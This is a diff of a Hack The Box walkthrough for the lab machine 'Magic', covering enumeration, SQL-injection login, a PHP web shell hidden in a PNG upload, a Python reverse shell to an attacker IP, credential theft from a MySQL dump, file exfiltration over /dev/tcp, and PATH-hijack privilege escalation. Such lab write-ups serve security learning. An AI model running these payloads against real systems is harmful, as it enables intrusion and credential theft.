@@ -1,20 +1,15 @@
-# HTB - <Machine_Name>
+# HTB - Magic
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/170533f9dba99f709ee55644e711b316c9739dad/linux-machines/medium/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
 
-#### <Useful thing 1>
-
-- description with generic example
-
-#### <Useful thing 2>
-
-- description with generic example
+* description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -22,7 +17,7 @@ Short description to include any strange things to be dealt with
 
 I started my enumeration with an nmap scan of `10.10.10.185`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 zweilos@kalimaa:~/htb/magic$ nmap -p- -sC -sV -oN magic.nmap 10.10.10.185
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-29 15:28 EDT
 Nmap scan report for 10.10.10.185
@@ -42,12 +37,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 822.01 seconds
 ```
+
 Only two ports open - 22 SSH and 80 HTTP
 
 nikto scan
-```
+
+```text
 Starting nikto scan
-                                                                                                        
+
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          10.10.10.185
@@ -76,16 +73,13 @@ Starting nikto scan
 Finished nikto scan
 ```
 
-https://www.sans.org/blog/http-verb-tampering-in-asp-net/
+[https://www.sans.org/blog/http-verb-tampering-in-asp-net/](https://www.sans.org/blog/http-verb-tampering-in-asp-net/)
 
-Tested for simple sql injection and was logged in!
-or
-found upload.php with dirbuster, and using verb tampering (as identified by nikto) was able to get the source code of the page.  
+Tested for simple sql injection and was logged in! or found upload.php with dirbuster, and using verb tampering \(as identified by nikto\) was able to get the source code of the page.
 
-from here I was able to craft an image upload with a png file header and php code in it and send it using Burp Repeater.  I got this idea a while back from watching one of Ippsec's videos [HackTheBox - Vault](https://www.youtube.com/watch?v=LfbwlPxToBc&t=519s)
+from here I was able to craft an image upload with a png file header and php code in it and send it using Burp Repeater. I got this idea a while back from watching one of Ippsec's videos [HackTheBox - Vault](https://www.youtube.com/watch?v=LfbwlPxToBc&t=519s)
 
-https://www.php.net/manual/en/function.passthru.php
-https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru
+[https://www.php.net/manual/en/function.passthru.php](https://www.php.net/manual/en/function.passthru.php) [https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru](https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru)
 
 `<?php passthru($_GET['test']); ?>`
 
@@ -117,21 +111,22 @@ Content-Disposition: form-data; name="submit"
 Upload Image
 -----------------------------25702794813234425341306225294--
 ```
-Make this a hint:*This text will not work by directly copying and pasting.  The PNG file header has some other bytes in it that do not render as ASCII and do not copy properly, but Burp is capable of grabbing them if you capture a file upload/download.  I sent a test PNG first, then cut out everything but the headers to craft my payload.*  
 
-`whoami` returns `www-data`
-`pwd` gets me `/var/www/Magic/images/uploads`
+Make this a hint:_This text will not work by directly copying and pasting. The PNG file header has some other bytes in it that do not render as ASCII and do not copy properly, but Burp is capable of grabbing them if you capture a file upload/download. I sent a test PNG first, then cut out everything but the headers to craft my payload._
+
+`whoami` returns `www-data` `pwd` gets me `/var/www/Magic/images/uploads`
 
 `http://10.10.10.185/images/uploads/htb1.php.png?test=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` gets me...
 
-```
+```text
 http://10.10.10.185/images/uploads/htb1.php.png?test=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.57%22,8099));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
 ```
+
 sending a non-image file results in this message: `<script>alert('What are you trying to do there?')</script>`
 
 to get burp to catch the request I had to go into the settings and disable the default filter that tells it not to intercept image requests
 
-![](burp_pic)
+![](https://github.com/zweilosec/htb-writeups/tree/170533f9dba99f709ee55644e711b316c9739dad/linux-machines/medium/burp_pic)
 
 ```python
 zweilos@kalimaa:~/Downloads$ nc -lvnp 8099
@@ -151,8 +146,11 @@ zweilos@kalimaa:~/Downloads$ nc -lvnp 8099
 www-data@ubuntu:/var/www/Magic/images/uploads$ export TERM=xterm-256color
 www-data@ubuntu:/var/www/Magic/images/uploads$
 ```
+
 a shell!
+
 ## Initial Foothold
+
 ### Enumeration as `www-data`
 
 ```php
@@ -190,14 +188,15 @@ class Database
     }
 }
 ```
+
 lets try those creds on SSH...nope
 
-```
+```text
 www-data@ubuntu:/$ uname -a
 Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-```
+```text
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -242,9 +241,8 @@ theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
 sshd:x:123:65534::/run/sshd:/usr/sbin/nologin
 mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false
 ```
-only `theseus` and `root` can login
-what is this whoopsie process?
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11484
+
+only `theseus` and `root` can login what is this whoopsie process? [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11484](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11484)
 
 ## Road to User
 
@@ -252,13 +250,14 @@ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11484
 
 ### Finding user creds
 
-
-```
+```text
 tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
 ```
+
 There is a `mysql` service user, port 3306 is open...seems like MySQL is running! NExt I tried to find the executable files related to it to see how to get into the database.
-```
+
+```text
 www-data@ubuntu:/var/www/Magic/images/uploads$find / -name mysql* -executable 2>/dev/null
 /usr/sbin/mysqld
 /usr/share/php7.4-mysql/mysql
@@ -318,13 +317,15 @@ www-data@ubuntu:/var/www/Magic/images/uploads$find / -name mysql* -executable 2>
 /var/lib/dpkg/info/mysql-common.preinst
 /var/lib/dpkg/info/mysql-server-5.7.postrm
 /var/lib/mysql-upgrade
- ```
-There were lots of programs installed related to mysql in `/usr/bin`.  The one called `mysqldump` sounded particularly interesting. A quick search led me to the official documentation at https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html 
+```
 
-> The mysqldump client utility performs logical backups, producing a set of SQL statements that can be executed to reproduce the original database object definitions and table data. It dumps one or more MySQL databases for backup or transfer to another SQL server. The mysqldump command can also generate output in CSV, other delimited text, or XML format. 
+There were lots of programs installed related to mysql in `/usr/bin`. The one called `mysqldump` sounded particularly interesting. A quick search led me to the official documentation at [https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html](https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html)
+
+> The mysqldump client utility performs logical backups, producing a set of SQL statements that can be executed to reproduce the original database object definitions and table data. It dumps one or more MySQL databases for backup or transfer to another SQL server. The mysqldump command can also generate output in CSV, other delimited text, or XML format.
 
 Sounds like a nice and easy way to quickly dump the database! The file `db.php5` in the web directory told me the database name was `Magic` and also gave me the username and password.
-```
+
+```text
 www-data@ubuntu:/usr/bin$ mysqldump --databases Magic -u theseus -p            
 Enter password: 
 -- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)u theseus -p imamkingthese
@@ -390,11 +391,11 @@ UNLOCK TABLES;
 -- Dump completed on 2020-08-03 18:24:24
 ```
 
-The table named `login` had another set of credentials, this time for `admin:Th3s3usW4sK1ng`.  These credentials did not work for the Magic database.  It did however let me `su` to user `theseus`!
+The table named `login` had another set of credentials, this time for `admin:Th3s3usW4sK1ng`. These credentials did not work for the Magic database. It did however let me `su` to user `theseus`!
 
 ### User.txt
 
-```
+```text
 theseus@ubuntu:~$ ls
 Desktop    Downloads  Pictures  Templates  Videos
 Documents  Music      Public    user.txt
@@ -404,21 +405,23 @@ theseus@ubuntu:~$ cat user.txt
 
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as User <username>
+### Enumeration as User
 
-```
+```text
 theseus@ubuntu:/dev/shm$ id
 uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
 ```
+
 user group is abnormal...what files can this user access?
 
-```
+```text
 theseus@ubuntu:/dev/shm$ find / -group users 2>/dev/null
 /bin/sysinfo
 ```
-Only one file...supicious...and linpeas.sh shows /bin/sysinfo as suid
-pspy shows
-```
+
+Only one file...supicious...and linpeas.sh shows /bin/sysinfo as suid pspy shows
+
+```text
 2020/08/03 18:38:32 CMD: UID=122  PID=1138   | /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid                                                                                                 
 2020/08/03 18:38:32 CMD: UID=0    PID=1125   | gdm-session-worker [pam/gdm-launch-environment] 
 2020/08/03 18:38:32 CMD: UID=0    PID=1115   | /usr/sbin/gdm3 
@@ -462,10 +465,12 @@ pspy shows
 2020/08/03 18:39:08 CMD: UID=???  PID=32614  | ???
 2020/08/03 18:39:08 CMD: UID=???  PID=32619  | ???
 2020/08/03 18:39:08 CMD: UID=???  PID=32617  | ???
-2020/08/03 18:39:08 CMD: UID=0    PID=32623  | pidof apache2 php7.4 apache2 php7.3 apache2 php5.6 
+2020/08/03 18:39:08 CMD: UID=0    PID=32623  | pidof apache2 php7.4 apache2 php7.3 apache2 php5.6
 ```
-I didn't know there was a sysinfo program for linux so I searched for privesc related to that.  It turns out there was a vulnerability in such a program, back in 2018.
-```
+
+I didn't know there was a sysinfo program for linux so I searched for privesc related to that. It turns out there was a vulnerability in such a program, back in 2018.
+
+```text
 theseus@ubuntu:/dev/shm$ sysinfo
 ====================Hardware Info====================
 H/W path           Device      Class      Description
@@ -583,22 +588,27 @@ Mem:           3.8G        665M        892M         10M        2.3G        2.9G
 Swap:          947M          0B        947M
 ```
 
-however this program seemed to be running a few other commands.  I recognized the output from the last part under "Mem Usage" as from the program `free`. 
-```
+however this program seemed to be running a few other commands. I recognized the output from the last part under "Mem Usage" as from the program `free`.
+
+```text
 theseus@ubuntu:/dev/shm$ free
               total        used        free      shared  buff/cache   available
 Mem:        4030648      680836      914544       10444     2435268     3049920
 Swap:        969960           0      969960
 ```
-Pretty much the same output! 
-```
+
+Pretty much the same output!
+
+```text
 theseus@ubuntu:/dev/shm$ free -h
               total        used        free      shared  buff/cache   available
 Mem:           3.8G        668M        888M         10M        2.3G        2.9G
 Swap:          947M          0B        947M
 ```
-while trying to get the help for the `free` program I stumbled upon the right flag to match the exact output from `sysinfo`.  from the man page:
-```
+
+while trying to get the help for the `free` program I stumbled upon the right flag to match the exact output from `sysinfo`. from the man page:
+
+```text
 -h, --human
               Show  all  output fields automatically scaled to shortest three digit unit and display
               the units of print out.  Following units are used.
@@ -610,39 +620,38 @@ while trying to get the help for the `free` program I stumbled upon the right fl
                 Ti = tebibyte
                 Pi = pebibyte
 ```
-These units of measurement are based on 1024 rather than 1000.  Storage is created using these measurements, so it is more accurate to the physical hardware.  Marketing departments like to round this number to 1000 and use the standard kilo-, mega-, and giga-, etc. because it makes the storage size seem bigger, without actually lying!  This is why your "500GB" hard drive only shows 465.661287 (or so) in the OS.  Sneaky... 
+
+These units of measurement are based on 1024 rather than 1000. Storage is created using these measurements, so it is more accurate to the physical hardware. Marketing departments like to round this number to 1000 and use the standard kilo-, mega-, and giga-, etc. because it makes the storage size seem bigger, without actually lying! This is why your "500GB" hard drive only shows 465.661287 \(or so\) in the OS. Sneaky...
 
 hint: you can use the Bing in-search calculator to convert between the two measurements by typing `convert 500GB to gibibytes`.
 
-I decided to exfiltrate the `sysinfo` program see how it worked.
-`theseus@ubuntu:/dev/shm$ cat /bin/sysinfo > /dev/tcp/10.10.15.57/8099`
+I decided to exfiltrate the `sysinfo` program see how it worked. `theseus@ubuntu:/dev/shm$ cat /bin/sysinfo > /dev/tcp/10.10.15.57/8099`
 
-![](ghidra_pic)
+![](https://github.com/zweilosec/htb-writeups/tree/170533f9dba99f709ee55644e711b316c9739dad/linux-machines/medium/ghidra_pic)
 
-By examining the program sysinfo in `ghidra` I could see that it called multiple other programs, similar to a bash script.  The problem with this program was that it called these external programs only by name, and did not use the full absolute paths.  This can allow a malicious attacker (or even a freindly neighborhood security researcher!) to create their own program in a folder that exists in the PATH earlier than the real one (or one could simply prepend a folder of their choosing to the PATH environment variable!)
+By examining the program sysinfo in `ghidra` I could see that it called multiple other programs, similar to a bash script. The problem with this program was that it called these external programs only by name, and did not use the full absolute paths. This can allow a malicious attacker \(or even a freindly neighborhood security researcher!\) to create their own program in a folder that exists in the PATH earlier than the real one \(or one could simply prepend a folder of their choosing to the PATH environment variable!\)
 
 `lshw, fdisk, free, cat /proc/cpuinfo`
 
 I decided to create my own `free` file, which hosted my reverse shell from earlier to see if I could get `sysinfo` to run it as `root`.  
-I had to add my working folder to the PATH, and then 
-`theseus@ubuntu:/tmp$ export PATH=/dev/shm:$PATH`
+I had to add my working folder to the PATH, and then `theseus@ubuntu:/tmp$ export PATH=/dev/shm:$PATH`
 
-I also had to make sure to make the file was executable by root (`+x` makes it executable for everyone unless you specify a UGO category).  
+I also had to make sure to make the file was executable by root \(`+x` makes it executable for everyone unless you specify a UGO category\).  
 `theseus@ubuntu:/tmp$ chmod +x free`
-
 
 ### Getting a shell
 
-
 ### Root.txt
 
-```
+```text
 root@ubuntu:/root# cat root.txt
 cat root.txt
 80e2d752b4d0608b8d2f896827290f37
 ```
+
 and here is the sysinfo binary code:
-```
+
+```text
 root@ubuntu:/root# cat info.c
 cat info.c
 #include <unistd.h>
@@ -685,6 +694,7 @@ int main() {
 }
 ```
 
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for <something interesting or useful about this machine>.
+Thanks to [`TRX`](https://www.hackthebox.eu/home/users/profile/31190) for .
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
